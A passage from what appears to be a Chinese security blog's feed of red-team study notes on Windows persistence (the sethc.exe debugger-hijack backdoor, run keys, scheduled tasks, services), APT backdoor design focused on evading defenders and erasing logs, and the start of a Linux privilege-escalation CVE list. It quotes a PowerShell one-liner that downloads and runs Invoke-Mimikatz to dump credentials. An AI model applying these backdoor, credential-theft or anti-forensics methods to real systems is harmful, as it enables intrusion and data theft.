class="hljs-regexp">//</span>www.freebuf.com<span class="hljs-regexp">/articles/</span>system/<span class="hljs-number">169925</span>.html</code></pre><hr><h4 id="7-1-2-4-Shift映像劫持后门新玩法"><a href="#7-1-2-4-Shift映像劫持后门新玩法" class="headerlink" title="7.1.2.4 Shift映像劫持后门新玩法"></a>7.1.2.4 Shift映像劫持后门新玩法</h4><p><strong>映像劫持简介</strong></p><p>映像劫持（Image File Execution Options），简单的说法，就是当你打开的是程序A，而运行的确是程序B。</p><p>映像劫持其实是Windows内设的用来调试程序的功能，但是现在却往往被病毒恶意利用。当用户双击对应的程序后，操作系统就会给外壳程序（例如“explorer.exe”）发布相应的指令，其中包含有执行程序的路径和文件名，然后由外壳程序来执行该程序。事实上在该过程中，Windows还会在注册表的上述路径中查询所有的映像劫持子键，如果存在和该程序名称完全相同的子键，就查询对应子健中包含的“Dubugger”键值名，并用其指定的程序路径来代替原始的程序，之后执行的是遭到“劫持”的虚假程序。</p><p><strong>简单测试</strong></p><p>映像劫持技术的利用，存在已久，这里再简单说明下：修改注册表HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options下sethc.exe，添加一个Debugger字符值（REG_SZ），并且赋值为cmd.exe的执行路径为C:\windows\system32\cmd.exe</p><p>之后键入五下Shift执行sethc.exe程序时便会执行cmd.exe程序。</p><p><strong>映像劫持后门新玩法</strong></p><p>参考文章：</p><pre><code class="hljs awk">https:<span class="hljs-regexp">//</span>zhuanlan.zhihu.com<span class="hljs-regexp">/p/</span><span class="hljs-number">98526538</span></code></pre><hr><h4 id="7-1-2-4-windows权限维持篇-注册表维权"><a href="#7-1-2-4-windows权限维持篇-注册表维权" class="headerlink" title="7.1.2.4 windows权限维持篇-注册表维权"></a>7.1.2.4 windows权限维持篇-注册表维权</h4><pre><code class="hljs awk">https:<span class="hljs-regexp">//</span>cloud.tencent.com<span class="hljs-regexp">/developer/</span>article/<span class="hljs-number">1553305</span>https:<span class="hljs-regexp">//</span>www.cnblogs.com<span class="hljs-regexp">/xiaozi/</span>p/<span class="hljs-number">11798030</span>.html ---Window权限维持（一）：注册表运行键</code></pre><p>书上的知识点很详细的介绍了，思路很清晰！！！</p><hr><h4 id="7-1-2-5-windows权限维持篇2-计划任务维权"><a href="#7-1-2-5-windows权限维持篇2-计划任务维权" class="headerlink" title="7.1.2.5 windows权限维持篇2-计划任务维权"></a>7.1.2.5 windows权限维持篇2-计划任务维权</h4><pre><code class="hljs awk">https:<span class="hljs-regexp">//</span>www.cnblogs.com<span class="hljs-regexp">/xiaozi/</span>p/<span class="hljs-number">11797078</span>.html</code></pre><p>书上的知识点很详细的介绍了，思路很清晰！！！</p><hr><h4 id="7-1-2-6-windows-权限维持篇3-服务service维权"><a href="#7-1-2-6-windows-权限维持篇3-服务service维权" class="headerlink" title="7.1.2.6 windows 权限维持篇3-服务service维权"></a>7.1.2.6 windows 权限维持篇3-服务service维权</h4><pre><code class="hljs awk">https:<span class="hljs-regexp">//</span>www.cnblogs.com<span class="hljs-regexp">/xiaozi/</span>p/<span class="hljs-number">11815957</span>.html</code></pre><p>书上的知识点很详细的介绍了，思路很清晰！！！<br>介绍了命令行方式添加服务、powershell形式添加服务、SharPersist添加服务进行、Metasploit服务维权模块进行权限维持讲解！！</p><hr><h2 id="7-2-第三方组件后门"><a href="#7-2-第三方组件后门" class="headerlink" title="7.2 第三方组件后门"></a>7.2 第三方组件后门</h2><p>开始Windows也简单介绍了…</p><h3 id="7-2-1-APT对抗（一）红蓝对抗关于后门对抗"><a href="#7-2-1-APT对抗（一）红蓝对抗关于后门对抗" class="headerlink" title="7.2.1 APT对抗（一）红蓝对抗关于后门对抗"></a>7.2.1 APT对抗（一）红蓝对抗关于后门对抗</h3><pre><code class="hljs awk">https:<span class="hljs-regexp">//</span>cloud.tencent.com<span class="hljs-regexp">/developer/</span>article/<span class="hljs-number">1497360</span></code></pre><h3 id="7-2-2-APT对抗（二）红蓝对抗关于后门对抗"><a href="#7-2-2-APT对抗（二）红蓝对抗关于后门对抗" class="headerlink" title="7.2.2 APT对抗（二）红蓝对抗关于后门对抗"></a>7.2.2 APT对抗（二）红蓝对抗关于后门对抗</h3><pre><code class="hljs awk">https:<span class="hljs-regexp">//</span>cloud.tencent.com<span class="hljs-regexp">/developer/</span>article/<span class="hljs-number">1497361</span></code></pre><hr><h3 id="7-2-3-APT对抗（三）红蓝对抗关于后门对抗"><a href="#7-2-3-APT对抗（三）红蓝对抗关于后门对抗" class="headerlink" title="7.2.3 APT对抗（三）红蓝对抗关于后门对抗"></a>7.2.3 APT对抗（三）红蓝对抗关于后门对抗</h3><p><strong>前者的话:</strong> 从第三季开始引入段子，让本枯燥的学术文章，也变得生动有趣。第二季的Demo遵循人性五条来设计，回忆这其中五条：</p><p><strong>1、攻击方与防御方的本质是什么?</strong></p><p>增加对方的时间成本，人力成本，资源成本（不限制于服务器资源），金钱成本。</p><p><strong>2、安全公司的本质是什么?</strong></p><p>盈利、最小投入、最大产出</p><p><strong>3、安全公司产品的本质是什么?</strong></p><p>能适应大部分客户，适应市场化，并且适应大部分机器。（包括不限制于资源紧张,宽带不足等问题的客户）</p><p><strong>4、安全人员的本质是什么?</strong></p><p>赚钱，养家。买房，还房贷。导致，快速解决客户问题（无论暂时还是永久性解决），以免投诉。</p><p><strong>5、对接客户的本质是什么?</strong></p><p>对接客户也是某公司内安全工作的一员、与概念4相同。</p><p><strong>6、线索排查与反线索排查</strong></p><p>那么这个demo离可高级可持续性渗透后门还有一段距离，这里引入第六条<code>线索排查</code>与<code>反线索排查</code>,在第二季的dem中，它生成了一个名为 micropoor.的文件，如果经验丰富的安全人员可根据时间差来排查日记，demo的工作流程大致是这样的，打开 notepad++，生成 micropoor. txt，写入内容，关闭文件流。根据线索排查，定位到 notepad++，导致权限失控。</p><p>在线索排查概念中，这里要引入“ABC”类线索关联排查，当防御者在得到线索A，顺藤到B，最后排查到目标文件C，根据五条中的第一条，demo要考虑如何删除指定日志内容，以及其他操作。来阻止ABC类线索关联排查。</p><p><strong>不要思维固死在这是一个 notepad++后门的文章，它是一个面向类后门，面向的是可掌握源码编译的类后门。</strong></p><p>同样不要把思维固定死在demo中的例子，针对不同版本的NT系统，完全引用”powershell IEX(New-Object System.Net.WebClient).DownloadString(‘<a href="https://raw.githubusercontent.com/clymb3r/Powershell/master/Invoke-Mimikatz/Invoke-Mimikatz.ps1%E2%80%99);Invoke-Mimikatz&quot;%E8%80%8C%E5%85%B3%E4%BA%8Ebypass">https://raw.githubusercontent.com/clymb3r/Powershell/master/Invoke-Mimikatz/Invoke-Mimikatz.ps1’);Invoke-Mimikatz&quot;而关于bypass</a> UAC，已经有成熟的源码。或发送至远程或是写在本地的图片里，不要让知识限制了后门的想象。这也正是第一季所说的：一个优秀的 Microdot是量身目标制定且一般不具备通用性的。一般不具备通用性。</p><p>观看目前文章的一共有2类人，一类攻击方，一类防守方。假设一个场景，现在摆在你面前有一台笔记本，并且这台笔记本有明确的后门，你的任务，排查后门。我想所有人都会排查注册表，服务，端口，进程等。因为这些具备通用性，也同样具备通用性排查手段。</p><p>临近文章结尾，第三次引用：在后门的进化对抗中，rootkit发生了变化，最大的改变是它的系统层次结构发生了变化。</p><hr><h3 id="7-2-4-APT对抗（四）红蓝对抗关于后门对抗"><a href="#7-2-4-APT对抗（四）红蓝对抗关于后门对抗" class="headerlink" title="7.2.4 APT对抗（四）红蓝对抗关于后门对抗"></a>7.2.4 APT对抗（四）红蓝对抗关于后门对抗</h3><p>第四季是一个过渡季，过渡后门在对抗升级中由传统后门，衍生成锁定目标的制定后门。</p><p>引用百度百科的“后门程序”的相关解释 ：</p><pre><code class="hljs xquery">https://baike.baidu.com/<span class="hljs-type">item</span>/<span class="hljs-meta">%E5</span><span class="hljs-meta">%90</span><span class="hljs-meta">%8E</span><span class="hljs-meta">%E9</span><span class="hljs-meta">%97</span><span class="hljs-meta">%A8</span><span class="hljs-meta">%E7</span><span class="hljs-meta">%A8</span><span class="hljs-meta">%8B</span><span class="hljs-meta">%E5</span><span class="hljs-meta">%BA</span><span class="hljs-meta">%8F</span>/<span class="hljs-number">108154</span></code></pre><p>安全从业人员，其实至少一直在与传统后门对抗，比如最常见的webshell免杀与webshell过waf。应急中的样本取证查杀远控残留文件等。但是webshell，远控仅仅又是“backdoor”的其中一种。</p><p>这里按照上几季的风格继续引用几个概念，只有概念清晰，才能了解如何对抗。</p><p><strong>1：安全从业人员为什么要了解后门？</strong></p><p>防御是以市场为核心的，而不是以项目为核心。需要对抗的可能是黑产从业者的流量劫持相关后门，或者是政治黑客的高持续渗透权限把控后门等。</p><p><strong>2：攻击人员为什么要了解后门？</strong></p><p>随着对抗传统后门的产品越来越成熟，由特征查杀，到行为查杀，到态势感知。到大数据联合特征溯源锁定，如何反追踪，是一个非常值得思考的问题。</p><p><strong>3：后门与项目的关联是什么？</strong></p><p>某项目，被入侵，应急并加固解决，若干天后，再次被入侵依然篡改为某博彩。导致安全从业人员，客户之间的问题。</p><p><strong>4：后门与安全产品的关联是什么？</strong></p><p>某客户购买某安全产品套装，在实战中，一般由非重点关注服务器迂回渗透到核心服务器来跨过安全产品监控，得到相关权限后，后门起到越过安全产品。它会涉及对其他附属安全产品的影响。如客户质疑：为什么我都买了你们的套装，还被入侵。并且这还是第二次了。</p><p><strong>这里再一次引入百度百科的APT的主要特性：</strong></p><p>——潜伏性： 这些新型的攻击和威胁可能在用户环境中存在一年以上或更久，他们不断收集各种信息，直到收集到重要情报。而这些发动APT攻击的黑客目的往往不是为了在短时间内获利，而是把“被控主机”当成跳板，持续搜索，直到能彻底掌握所针对的目标人、事、物，所以这种APT攻击模式, 实质上是一种“恶意商业间谍威胁”。</p><p>——持续性： 由于APT攻击具有持续性甚至长达数年的特征，这让企业的管理人员无从察觉。在此期间，这种“持续性”体现在攻击者不断尝试的各种攻击手段，以及渗透到网络内部后长期蛰伏。</p><p>——锁定特定目标： 针对特定政府或企业，长期进行有计划性、组织性的窃取情报行为,针对被锁定对象寄送几可乱真的社交工程恶意邮件，如冒充客户的来信,取得在计算机植入恶意软件的第一个机会。</p><p>——安装远程控制工具： 攻击者建立一个类似僵尸网络Botnet的远程控制架构，攻击者会定期传送有潜在价值文件的副本给命令和控制服务器(C&amp;C Server)审查。将过滤后的敏感机密数据，利用加密的方式外传。</p><p><strong>一次针对特定对象，长期、有计划性渗透的本质是什么？</strong></p><p>窃取数据下载到本地，或者以此次渗透来达到变现目的。</p><p>一次具有针对性的渗透，绝对不单单是以渗透DMZ区为主，重要资料一般在内网服务器区（包括但不限制于数据库服务器，文件服务器，OA服务器），与内网办公区（包括但不限制于个人机，开发机，财务区）等。而往往这样的高级持续渗透，不能是一气呵成，需要一定时间内，来渗透到资料所在区域。而这里其中一个重要的环节就是对后门的要求 ，在渗透期间内（包括但不限制于一周到月甚至到年）以保持后续渗透。</p><p><strong>传统型的后门不在满足攻击者的需求，而传统型的木马后门， 大致可分为六代：</strong></p><p>第一代 ，是最原始的木马程序。主要是简单的密码窃取，通过电子邮件发送信息等，具备了木马最基本的功能。</p><p>第二代 ，在技术上有了很大的进步，冰河是中国木马的典型代表之一。</p><p>第三代 ，主要改进在数据传递技术方面，出现了ICMP等类型的木马，利用畸形报文传递数据，增加了杀毒软件查杀识别的难度。</p><p>第四代 ， 在进程隐藏方面有了很大改动，采用了内核插入式的嵌入方式，利用远程插入线程技术，嵌入DLL线程。或者挂接PSAPI，实现木马程序的隐藏，甚至在Windows NT/2000下，都达到了良好的隐藏效果。灰鸽子和蜜蜂大盗是比较出名的DLL木马。</p><p>第五代 ，驱动级木马。驱动级木马多数都使用了大量的Rootkit技术来达到在深度隐藏的效果，并深入到内核空间的，感染后针对杀毒软件和网络防火墙进行攻击，可将系统SSDT初始化，导致杀毒防火墙失去效应。有的驱动级木马可驻留BIOS，并且很难查杀。</p><p>第六代 ，随着身份认证UsbKey和杀毒软件主动防御的兴起，黏虫技术类型和特殊反显技术类型木马逐渐开始系统化。前者主要以盗取和篡改用户敏感信息为主，后者以动态口令和硬证书攻击为主。PassCopy和暗黑蜘蛛侠是这类木马的代表。</p><p>以远控举例，远控最开始生成的RAT功能一体化（包括但不限制于文件传输，命令执行等），后衍生成生成RAT支持插件式来达到最终目的。</p><p>以上的几代包括以上远控共同点，以独立服务或者独立进程，独立端口等来到达目的。难以对抗目前的反病毒反后门程序。那么传统型后门权限维持就不能满足目前的需求。</p><p>以第二季的demo举例，它无自己的进程，端口，服务，而是借助notepad++（非dll劫持）来生成php内存shell（这个过程相当于插件生成），并且无自启，当服务器重启后，继续等待管理员使用notepad++，它属于一个AB链后门，由A-notepad生成B-shell，以B-shell去完成其他工作。如果继续改进Demo，改造ABC链后门，A负责生成，B负责清理痕迹，C负责工作呢? 这是一个攻击者应该思考的问题。</p><p><strong>而后门的主要工作有2点 ：</strong></p><pre><code class="hljs plain">1、越过安全产品2、维持持续渗透权限</code></pre><p>文章的结尾，这不是一个notepad++的后门介绍，它是一个demo，一个类后门 ，一个具有源码可控类的后门</p><hr><h3 id="7-2-5-dll劫持"><a href="#7-2-5-dll劫持" class="headerlink" title="7.2.5 dll劫持"></a>7.2.5 dll劫持</h3><p>书上介绍了-两种劫持方法剖析，目前没找到实例，书上讲得很好…</p><p>另外的dll劫持：</p><pre><code class="hljs awk">https:<span class="hljs-regexp">//</span>www.cnblogs.com<span class="hljs-regexp">/h2zZhou/</span>p/<span class="hljs-number">8601375</span>.htmlhttps:<span class="hljs-regexp">//</span>www.<span class="hljs-number">4</span>hou.com<span class="hljs-regexp">/posts/</span>PrJ4https:<span class="hljs-regexp">//</span>www.freebuf.com<span class="hljs-regexp">/articles/</span>system/<span class="hljs-number">227824</span>.html</code></pre><hr><h3 id="7-2-6-APT对抗-红蓝对抗关于后门对抗（五-七）"><a href="#7-2-6-APT对抗-红蓝对抗关于后门对抗（五-七）" class="headerlink" title="7.2.6 APT对抗-红蓝对抗关于后门对抗（五~七）"></a>7.2.6 APT对抗-红蓝对抗关于后门对抗（五~七）</h3><p>详情见中册502页</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;七、权限维持&quot;&gt;&lt;a href=&quot;#七、权限维持&quot; class=&quot;headerlink&quot; title=&quot;七、权限维持&quot;&gt;&lt;/a&gt;七、权限维持&lt;/h1&gt;&lt;h2 id=&quot;7-1-操作系统后门&quot;&gt;&lt;a href=&quot;#7-1-操作系统后门&quot; class=&quot;headerli</summary>
      
    
    
    
    <category term="红队攻防" scheme="http://www.secice.cn/categories/%E7%BA%A2%E9%98%9F%E6%94%BB%E9%98%B2/"/>
    
    
    <category term="红队攻防" scheme="http://www.secice.cn/tags/%E7%BA%A2%E9%98%9F%E6%94%BB%E9%98%B2/"/>
    
    <category term="渗透攻击红队百科全书" scheme="http://www.secice.cn/tags/%E6%B8%97%E9%80%8F%E6%94%BB%E5%87%BB%E7%BA%A2%E9%98%9F%E7%99%BE%E7%A7%91%E5%85%A8%E4%B9%A6/"/>
    
  </entry>
  
  <entry>
    <title>红队攻防学习之权限提升</title>
    <link href="http://www.secice.cn/p/ad5b2fbd"/>
    <id>http://www.secice.cn/p/ad5b2fbd</id>
    <published>2020-12-28T07:44:42.000Z</published>
    <updated>2020-12-28T07:46:23.950Z</updated>
    
    <content type="html"><![CDATA[<h1 id="六、权限提升"><a href="#六、权限提升" class="headerlink" title="六、权限提升"></a>六、权限提升</h1><h2 id="6-1-操作系统提权"><a href="#6-1-操作系统提权" class="headerlink" title="6.1 操作系统提权"></a>6.1 操作系统提权</h2><h3 id="6-1-1-Linux"><a href="#6-1-1-Linux" class="headerlink" title="6.1.1 Linux"></a>6.1.1 Linux</h3><h4 id="6-1-1-1-Linux提权-依赖exp"><a href="#6-1-1-1-Linux提权-依赖exp" class="headerlink" title="6.1.1.1 Linux提权-依赖exp"></a>6.1.1.1 Linux提权-依赖exp</h4><p><strong>exp注：</strong></p><pre><code class="hljs subunit">CVE<span class="hljs-string">-2017</span><span class="hljs-string">-1000367</span> [Sudo] (Sudo 1.8.6p7 - 1.8.20)CVE<span class="hljs-string">-2017</span><span class="hljs-string">-1000112</span> [a memory corruption due to UFO to non-UFO path switch]CVE<span class="hljs-string">-2017</span><span class="hljs-string">-7494</span> [Samba Remote execution] (Samba 3.5.0<span class="hljs-string">-4</span>.6.4/4.5.10/4.4.14)CVE<span class="hljs-string">-2017</span><span class="hljs-string">-7308</span> [a signedness issue in AF_PACKET sockets] (Linux kernel through 4.10.6)CVE<span class="hljs-string">-2017</span><span class="hljs-string">-6074</span> [a double-free in DCCP protocol] (Linux kernel through 4.9.11)CVE<span class="hljs-string">-2017</span><span class="hljs-string">-5123</span> [&#x27;waitid()&#x27;] (Kernel 4.14.0-rc4+)CVE<span class="hljs-string">-2016</span><span class="hljs-string">-9793</span> [a signedness issue with SO_SNDBUFFORCE and SO_RCVBUFFORCE socket options]  (Linux kernel before 4.8.14)CVE<span class="hljs-string">-2016</span><span class="hljs-string">-5195</span> [Dirty cow] (Linux kernel&gt;2.6.22 (released in 2007))CVE<span class="hljs-string">-2016</span><span class="hljs-string">-2384</span> [a double-free in USB MIDI driver]  (Linux kernel before 4.5)CVE<span class="hljs-string">-2016</span><span class="hljs-string">-0728</span> [pp_key] (3.8.0, 3.8.1, 3.8.2, 3.8.3, 3.8.4, 3.8.5, 3.8.6, 3.8.7, 3.8.8, 3.8.9, 3.9, 3.10, 3.11, 3.12, 3.13,3.4.0, 3.5.0, 3.6.0, 3.7.0, 3.8.0, 3.8.5, 3.8.6, 3.8.9, 3.9.0, 3.9.6,3.10.0, 3.10.6, 3.11.0, 3.12.0, 3.13.0, 3.13.1)CVE<span class="hljs-string">-2015</span><span class="hljs-string">-7547</span> [glibc getaddrinfo] (before Glibc 2.9)CVE<span class="hljs-string">-2015</span><span class="hljs-string">-1328</span> [overlayfs] (3.13, 3.16.0, 3.19.0)CVE<span class="hljs-string">-2014</span><span class="hljs-string">-5284</span> [OSSEC] (2.8)CVE<span class="hljs-string">-2014</span><span class="hljs-string">-4699</span> [ptrace] (before 3.15.4)CVE<span class="hljs-string">-2014</span><span class="hljs-string">-4014</span> [Local Privilege Escalation] (before 3.14.8)CVE<span class="hljs-string">-2014</span><span class="hljs-string">-3153</span> [futex]  (3.3.5 ,3.3.4 ,3.3.2 ,3.2.13 ,3.2.9 ,3.2.1 ,3.1.8 ,3.0.5 ,3.0.4 ,3.0.2 ,3.0.1 ,2.6.39 ,2.6.38 ,2.6.37 ,2.6.35 ,2.6.34 ,2.6.33 ,2.6.32 ,2.6.9 ,2.6.8,2.6.7 ,2.6.6 ,2.6.5 ,2.6.4 ,3.2.2 ,3.0.18 ,3.0 ,2.6.8.1)CVE<span class="hljs-string">-2014</span><span class="hljs-string">-0196</span> [rawmodePTY] (2.6.31, 2.6.32, 2.6.33, 2.6.34, 2.6.35, 2.6.36, 2.6.37, 2.6.38, 2.6.39, 3.14, 3.15)CVE<span class="hljs-string">-2014</span><span class="hljs-string">-0038</span> [timeoutpwn] (3.4, 3.5, 3.6, 3.7, 3.8, 3.8.9, 3.9, 3.10, 3.11, 3.12, 3.13, 3.4.0, 3.5.0, 3.6.0, 3.7.0, 3.8.0, 3.8.5, 3.8.6, 3.8.9, 3.9.0, 3.9.6, 3.10.0, 3.10.6, 3.11.0, 3.12.0, 3.13.0, 3.13.1)CVE<span class="hljs-string">-2013</span><span class="hljs-string">-2094</span> [perf_swevent] (3.0.0, 3.0.1, 3.0.2, 3.0.3, 3.0.4, 3.0.5, 3.0.6, 3.1.0, 3.2, 3.3, 3.4.0, 3.4.1, 3.4.2, 3.4.3, 3.4.4,3.4.5, 3.4.6, 3.4.8, 3.4.9, 3.5, 3.6, 3.7, 3.8.0, 3.8.1, 3.8.2, 3.8.3,3.8.4, 3.8.5, 3.8.6, 3.8.7, 3.8.8, 3.8.9)CVE<span class="hljs-string">-2013</span><span class="hljs-string">-1858</span> [clown-newuser] (3.3<span class="hljs-string">-3</span>.8)CVE<span class="hljs-string">-2013</span><span class="hljs-string">-1763</span> [__sock_diag_rcv_msg] (before 3.8.3)CVE<span class="hljs-string">-2013</span><span class="hljs-string">-0268</span> [msr]  (2.6.18, 2.6.19, 2.6.20, 2.6.21, 2.6.22, 2.6.23, 2.6.24, 2.6.25, 2.6.26,2.6.27, 2.6.27, 2.6.28,2.6.29, 2.6.30, 2.6.31, 2.6.32, 2.6.33, 2.6.34, 2.6.35, 2.6.36, 2.6.37,2.6.38, 2.6.39, 3.0.0,3.0.1, 3.0.2, 3.0.3, 3.0.4, 3.0.5, 3.0.6, 3.1.0, 3.2, 3.3, 3.4, 3.5, 3.6, 3.7.0, 3.7.6)CVE<span class="hljs-string">-2012</span><span class="hljs-string">-3524</span> [libdbus] (libdbus 1.5.x and earlier)CVE<span class="hljs-string">-2012</span><span class="hljs-string">-0056</span> [memodipper] (2.6.39, 3.0.0, 3.0.1, 3.0.2, 3.0.3, 3.0.4, 3.0.5, 3.0.6, 3.1.0)CVE<span class="hljs-string">-2010</span><span class="hljs-string">-4347</span> [american-sign-language] ( 2.6.0, 2.6.1, 2.6.2, 2.6.3, 2.6.4, 2.6.5, 2.6.6, 2.6.7, 2.6.8, 2.6.9,2.6.10, 2.6.11, 2.6.12, 2.6.13, 2.6.14, 2.6.15, 2.6.16, 2.6.17, 2.6.18, 2.6.19, 2.6.20, 2.6.21,2.6.22, 2.6.23, 2.6.24, 2.6.25, 2.6.26, 2.6.27, 2.6.28, 2.6.29, 2.6.30, 2.6.31, 2.6.32, 2.6.33, 2.6.34, 2.6.35, 2.6.36)CVE<span class="hljs-string">-2010</span><span class="hljs-string">-4258</span> [full-nelson] (2.6.31, 2.6.32, 2.6.35, 2.6.37)CVE<span class="hljs-string">-2010</span><span class="hljs-string">-4073</span> [half_nelson] (2.6.0, 2.6.1, 2.6.2, 2.6.3, 2.6.4, 2.6.5, 2.6.6, 2.6.7, 2.6.8, 2.6.9,2.6.10, 2.6.11, 2.6.12,2.6.13, 2.6.14, 2.6.15, 2.6.16, 2.6.17, 2.6.18, 2.6.19, 2.6.20, 2.6.21,2.6.22, 2.6.23, 2.6.24,2.6.25, 2.6.26, 2.6.27, 2.6.28, 2.6.29, 2.6.30, 2.6.31, 2.6.32, 2.6.33,2.6.34, 2.6.35, 2.6.36)CVE<span class="hljs-string">-2010</span><span class="hljs-string">-3904</span> [rds] (2.6.30, 2.6.31, 2.6.32, 2.6.33, 2.6.34, 2.6.35, 2.6.36)CVE<span class="hljs-string">-2010</span><span class="hljs-string">-3437</span> [pktcdvd] (2.6.0, 2.6.1, 2.6.2, 2.6.3, 2.6.4, 2.6.5, 2.6.6, 2.6.7, 2.6.8, 2.6.9,2.6.10, 2.6.11, 2.6.12, 2.6.13, 2.6.14, 2.6.15, 2.6.16, 2.6.17, 2.6.18, 2.6.19, 2.6.20, 2.6.21,2.6.22, 2.6.23, 2.6.24, 2.6.25, 2.6.26, 2.6.27, 2.6.28, 2.6.29, 2.6.30, 2.6.31, 2.6.32, 2.6.33, 2.6.34, 2.6.35, 2.6.36)CVE<span class="hljs-string">-2010</span><span class="hljs-string">-3301</span> [ptrace_kmod2] (2.6.26, 2.6.27, 2.6.28, 2.6.29, 2.6.30, 2.6.31, 2.6.32, 2.6.33, 2.6.34)CVE<span class="hljs-string">-2010</span><span class="hljs-string">-3081</span> [video4linux] (2.6.0, 2.6.1, 2.6.2, 2.6.3, 2.6.4, 2.6.5, 2.6.6, 2.6.7, 2.6.8, 2.6.9, 2.6.10, 2.6.11, 2.6.12,2.6.13, 2.6.14, 2.6.15, 2.6.16, 2.6.17, 2.6.18, 2.6.19, 2.6.20, 2.6.21, 2.6.22, 2.6.23, 2.6.24, 2.6.25, 2.6.26, 2.6.27, 2.6.28, 2.6.29, 2.6.30, 2.6.31, 2.6.32, 2.6.33)CVE<span class="hljs-string">-2010</span><span class="hljs-string">-2959</span> [can_bcm] (2.6.18, 2.6.19, 2.6.20, 2.6.21, 2.6.22, 2.6.23, 2.6.24, 2.6.25, 2.6.26, 2.6.27, 2.6.28, 2.6.29, 2.6.30, 2.6.31, 2.6.32, 2.6.33, 2.6.34, 2.6.35, 2.6.36)CVE<span class="hljs-string">-2010</span><span class="hljs-string">-1146</span> [reiserfs] (2.6.18, 2.6.19, 2.6.20, 2.6.21, 2.6.22, 2.6.23, 2.6.24, 2.6.25, 2.6.26, 2.6.27, 2.6.28, 2.6.29, 2.6.30, 2.6.31, 2.6.32, 2.6.33, 2.6.34)CVE<span class="hljs-string">-2010</span><span class="hljs-string">-0415</span> [do_pages_move] (2.6.18, 2.6.19, 2.6.20, 2.6.21, 2.6.22, 2.6.23, 2.6.24, 2.6.25, 2.6.26, 2.6.27, 2.6.28, 2.6.29, 2.6.30, 2.6.31)CVE<span class="hljs-string">-2009</span><span class="hljs-string">-3547</span> [pipe.c_32bit] (2.4.4, 2.4.5, 2.4.6, 2.4.7, 2.4.8, 2.4.9, 2.4.10, 2.4.11, 2.4.12, 2.4.13,2.4.14, 2.4.15, 2.4.16, 2.4.17, 2.4.18, 2.4.19, 2.4.20, 2.4.21, 2.4.22, 2.4.23, 2.4.24, 2.4.25,2.4.26, 2.4.27, 2.4.28,2.4.29, 2.4.30, 2.4.31, 2.4.32, 2.4.33, 2.4.34, 2.4.35, 2.4.36, 2.4.37,2.6.15, 2.6.16, 2.6.17,2.6.18, 2.6.19, 2.6.20, 2.6.21, 2.6.22, 2.6.23, 2.6.24, 2.6.25, 2.6.26,2.6.27, 2.6.28, 2.6.29,2.6.30, 2.6.31)CVE<span class="hljs-string">-2009</span><span class="hljs-string">-2698</span> [udp_sendmsg_32bit] (2.6.1, 2.6.2, 2.6.3, 2.6.4, 2.6.5, 2.6.6, 2.6.7, 2.6.8, 2.6.9, 2.6.10, 2.6.11, 2.6.12, 2.6.13,  2.6.14, 2.6.15, 2.6.16, 2.6.17, 2.6.18, 2.6.19)CVE<span class="hljs-string">-2009</span><span class="hljs-string">-2692</span> [sock_sendpage] (2.4.4, 2.4.5, 2.4.6, 2.4.7, 2.4.8, 2.4.9, 2.4.10, 2.4.11, 2.4.12, 2.4.13,2.4.14, 2.4.15, 2.4.16,2.4.17, 2.4.18, 2.4.19, 2.4.20, 2.4.21, 2.4.22, 2.4.23, 2.4.24, 2.4.25, 2.4.26, 2.4.27, 2.4.28,2.4.29, 2.4.30, 2.4.31, 2.4.32, 2.4.33, 2.4.34, 2.4.35, 2.4.36, 2.4.37,2.6.0, 2.6.1, 2.6.2, 2.6.3, 2.6.4, 2.6.5, 2.6.6, 2.6.7, 2.6.8, 2.6.9, 2.6.10, 2.6.11, 2.6.12,2.6.13, 2.6.14, 2.6.15, 2.6.16, 2.6.17, 2.6.18, 2.6.19, 2.6.20, 2.6.21, 2.6.22, 2.6.23, 2.6.24, 2.6.25, 2.6.26, 2.6.27, 2.6.28, 2.6.29, 2.6.30)CVE<span class="hljs-string">-2009</span><span class="hljs-string">-2692</span> [sock_sendpage2] (2.4.4, 2.4.5, 2.4.6, 2.4.7, 2.4.8, 2.4.9, 2.4.10, 2.4.11, 2.4.12, 2.4.13, 2.4.14, 2.4.15, 2.4.16, 2.4.17, 2.4.18, 2.4.19, 2.4.20, 2.4.21, 2.4.22, 2.4.23, 2.4.24, 2.4.25,2.4.26, 2.4.27, 2.4.28,2.4.29, 2.4.30, 2.4.31, 2.4.32, 2.4.33, 2.4.34, 2.4.35, 2.4.36, 2.4.37, 2.6.0, 2.6.1, 2.6.2,2.6.3, 2.6.4, 2.6.5, 2.6.6, 2.6.7, 2.6.8, 2.6.9, 2.6.10, 2.6.11, 2.6.12, 2.6.13, 2.6.14, 2.6.15,2.6.16, 2.6.17, 2.6.18, 2.6.19, 2.6.20, 2.6.21, 2.6.22, 2.6.23, 2.6.24,2.6.25, 2.6.26, 2.6.27, 2.6.28, 2.6.29, 2.6.30)CVE<span class="hljs-string">-2009</span><span class="hljs-string">-1337</span> [exit_notify] (2.6.25, 2.6.26, 2.6.27, 2.6.28, 2.6.29)CVE<span class="hljs-string">-2009</span><span class="hljs-string">-1185</span> [udev] (2.6.25, 2.6.26, 2.6.27, 2.6.28, 2.6.29)CVE<span class="hljs-string">-2008</span><span class="hljs-string">-4210</span> [ftrex] (2.6.11, 2.6.12, 2.6.13, 2.6.14, 2.6.15, 2.6.16, 2.6.17, 2.6.18, 2.6.19,2.6.20, 2.6.21, 2.6.22)CVE<span class="hljs-string">-2008</span><span class="hljs-string">-0600</span> [vmsplice2] (2.6.23, 2.6.24)CVE<span class="hljs-string">-2008</span><span class="hljs-string">-0600</span> [vmsplice1] (2.6.17, 2.6.18, 2.6.19, 2.6.20, 2.6.21, 2.6.22, 2.6.23, 2.6.24, 2.6.24.1)CVE<span class="hljs-string">-2006</span><span class="hljs-string">-3626</span> [h00lyshit] (2.6.8, 2.6.10, 2.6.11, 2.6.12, 2.6.13, 2.6.14, 2.6.15, 2.6.16)CVE<span class="hljs-string">-2006</span><span class="hljs-string">-2451</span> [raptor_prctl] (2.6.13, 2.6.14, 2.6.15, 2.6.16, 2.6.17)CVE<span class="hljs-string">-2005</span><span class="hljs-string">-0736</span> [krad3] (2.6.5, 2.6.7, 2.6.8, 2.6.9, 2.6.10, 2.6.11)CVE<span class="hljs-string">-2005</span><span class="hljs-string">-1263</span> [binfmt_elf.c] (Linux kernel 2.x.x to 2.2.27-rc2, 2.4.x to 2.4.31-pre1, and 2.6.x to 2.6.12-rc4)CVE<span class="hljs-string">-2004</span><span class="hljs-string">-1235</span> [elflbl] (2.4.29)CVE-N/A [caps_to_root]  (2.6.34, 2.6.35, 2.6.36)CVE<span class="hljs-string">-2004</span><span 